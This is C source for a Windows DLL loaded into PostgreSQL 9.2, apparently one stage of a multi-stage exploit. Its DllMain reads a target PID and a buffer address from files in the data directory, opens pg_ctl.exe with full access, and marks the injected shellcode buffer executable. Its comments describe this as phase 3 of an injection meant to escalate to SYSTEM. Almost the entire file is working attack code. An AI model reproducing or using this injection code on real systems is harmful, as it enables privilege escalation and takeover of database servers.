// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars32.bat"
// cl.exe /D_USRDLL /D_WINDLL /MT /Tc pgext4.cpp /link /DLL /out:pgext4.dll /SUBSYSTEM:CONSOLE /MACHINE:x86

#include "dll.h"
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"advapi32.lib")

	
HANDLE log_file = NULL;
DWORD bytesWritten = 0;
DWORD bytesRead = 0;
BOOL verbose_output = TRUE;
DWORD pgctl_pid = 0;
DWORD bufferSize = 1024; // won't be more

void log_msg(const char * line)
{
	if(verbose_output) WriteFile(log_file,line,strlen(line),&bytesWritten, NULL);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if(ul_reason_for_call != DLL_PROCESS_ATTACH) return 0; // only execute this once, during process attach (we don't want this to run twice)
	if(verbose_output)
	{
		log_file = CreateFileA("C:\\Program Files (x86)\\PostgreSQL\\9.2\\data\\ext.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // create the log
		if (log_file != INVALID_HANDLE_VALUE)
		{
			SetFilePointer(log_file, 0, NULL, FILE_END);
		}
	}
	// first, obtain the PID of the pg_ctl.exe process, because that's where we have to inject our shellcode, as we are currently in one of the postgres.exe processes, which all have weak primary tokens that do not hold SeImpersonate privilege and thus won't allow us to escalate to SYSTEM
	HANDLE pid_file = CreateFileA("C:\\Program Files (x86)\\PostgreSQL\\9.2\\data\\ext.pid", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(pid_file==INVALID_HANDLE_VALUE)
	{
		log_msg("Cannot open PID file. Exiting.\n");
		if(verbose_output) CloseHandle(log_file);	
		return 0;
	}
	ReadFile(pid_file,&pgctl_pid,sizeof(pgctl_pid),&bytesRead,NULL);
	CloseHandle(pid_file);
	
    if (!pgctl_pid) {		
        log_msg("Process PID not found in the log.\n");
		if(verbose_output) CloseHandle(log_file);
        return 1;
    }
	else
	{
		char msg[100];
		snprintf(msg,sizeof(msg),"PID found (ext4) in the log: %d\n",pgctl_pid);
		log_msg(msg);		
	
		// we already have the buffer allocated, now we need to retrieve its address from the file
		// so first we need to recover it
		LPVOID remoteBuffer = NULL;
		HANDLE ptr_file = CreateFileA("C:\\Program Files (x86)\\PostgreSQL\\9.2\\data\\buff.addr", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);		
		if(ptr_file==INVALID_HANDLE_VALUE)
		{	
			log_msg("Cannot open PTR file (ext4). Exiting.\n");
			if(verbose_output) CloseHandle(log_file);	
			return 0;
		}		
		DWORD ptrAsInt = 0;
		ReadFile(ptr_file,&ptrAsInt,sizeof(DWORD),&bytesRead,NULL);
		CloseHandle(ptr_file);	
		remoteBuffer = (LPVOID)ptrAsInt;
				

		snprintf(msg,sizeof(msg),"Remote buffer address read from the ptr file (ext4): %p\n",remoteBuffer);
		log_msg(msg);			
		// OK, now, conduct phase 3 of the injection process, now we write into it.
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pgctl_pid);
		if (!hProcess) {
			log_msg("Failed to open process.\n");
			printf("LAST ERROR: %d",GetLastError());
			return 0;
		}
		
		// now, we make the memory executable
		DWORD oldProtect;
		if (!VirtualProtectEx(hProcess, remoteBuffer, bufferSize, PAGE_EXECUTE_READ, &oldProtect)) {
			log_msg("Failed to change memory protection.\n");
			//VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);			
			return 0;
		}		

		CloseHandle(hProcess);
		log_msg("Payload made executable, ext4 completed.\n");
		if(verbose_output) CloseHandle(log_file);	
	}
    return 0;
}